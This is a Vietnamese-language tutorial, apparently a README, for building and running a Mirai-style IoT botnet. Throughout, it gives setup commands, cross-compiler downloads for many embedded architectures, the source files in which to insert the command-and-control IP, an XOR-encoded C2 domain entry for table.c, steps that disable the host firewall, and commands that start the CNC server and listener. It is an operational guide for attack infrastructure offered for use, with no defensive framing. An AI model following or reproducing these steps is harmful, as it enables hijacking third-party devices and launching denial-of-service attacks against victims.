TUT của zxcr9999

### Sao chép và dán tất cả vào shit vps của bạn
```
yum update -y
yum install epel-release -y
yum groupinstall "Development Tools" -y
yum install gmp-devel -y
ln -s /usr/lib64/libgmp.so.3  /usr/lib64/libgmp.so.10
yum install screen wget bzip2 gcc nano gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y
```

### cài đặt golang
```
cd /tmp
wget https://dl.google.com/go/go1.13.linux-amd64.tar.gz
sha256sum go1.13.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.13.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
export GOROOT=/usr/local/go
export GOPATH=$HOME/Projects/Proj1
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords
source ~/.bash_profile
go version
go env
cd ~/
```

### thay đổi ip
```
loader/src/main.c
loader/src/headers/config.h
dlr/main.c
bot/huawei.c
bot/util.c
```

### thêm tên miền

kéo tệp `enc.c` vào vps của bạn và gõ lệnh
```
gcc enc.c -o enc -std=c99
```
```
./enc string botnet.yourdomain.com
```
và thêm `TABLE_CNC_DOMAIN` vào trong tệp `table.c`

`botnet.yourdomain.com` là tên miền của bạn và nó được kết nối với IP để lưu trữ botnet

`add_entry(TABLE_CNC_DOMAIN, "\xa2\xaf\xa2\xef\xb3\xa0\xbb\xaf\xa4\xb5\xf3\xf1\xf3\xf0\xef\xac\xad", 17);`

số 17 sẽ tương ứng với byte xor
```
mkdir /etc/xcompile
cd /etc/xcompile
```
```
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2
wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2
wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2
```
```
tar -jxf cross-compiler-i586.tar.bz2
tar -jxf cross-compiler-m68k.tar.bz2
tar -jxf cross-compiler-mips.tar.bz2
tar -jxf cross-compiler-mipsel.tar.bz2
tar -jxf cross-compiler-powerpc.tar.bz2
tar -jxf cross-compiler-sh4.tar.bz2
tar -jxf cross-compiler-sparc.tar.bz2
tar -jxf cross-compiler-armv4l.tar.bz2
tar -jxf cross-compiler-armv5l.tar.bz2
tar -jxf cross-compiler-armv6l.tar.bz2
tar -jxf cross-compiler-armv7l.tar.bz2
tar -jxf cross-compiler-x86_64.tar.bz2
```
```
rm -rf *.tar.*
```
```
mv cross-compiler-i586 i586
mv cross-compiler-m68k m68k
mv cross-compiler-mips mips
mv cross-compiler-mipsel mipsel
mv cross-compiler-powerpc powerpc
mv cross-compiler-sh4 sh4
mv cross-compiler-sparc sparc
mv cross-compiler-armv4l armv4l
mv cross-compiler-armv5l armv5l
mv cross-compiler-armv6l armv6l
mv cross-compiler-armv7l armv7l
mv cross-compiler-x86_64 x86_64
```

### Bắt đầu xây dựng
```
service firewalld stop
service iptables stop 
service httpd restart  
service mariadb stop
```
```
cd cnc/
sh build.sh
```
```
cd ~/
chmod 777 *
sh build.sh
```
```
nano /usr/include/bits/typesizes.h
```
cuộn xuống và chỉnh sửa 1024 thành 999999

SAU ĐÓ LƯU
```
ulimit -n999999; ulimit -u999999; ulimit -e999999
```
### Xây dựng file `.sh`
python payload.py

### Cách khởi động cnc và listen
```
cd cnc/
screen ./cnc 56999 1337 10
screen ./listen
```

Help: 56999 là cổng bot (nếu muốn thay thì vào file `bot/main.c` dòng 429), 1337 là cổng cnc, 10 là luồng (tối đa luồng là 750)
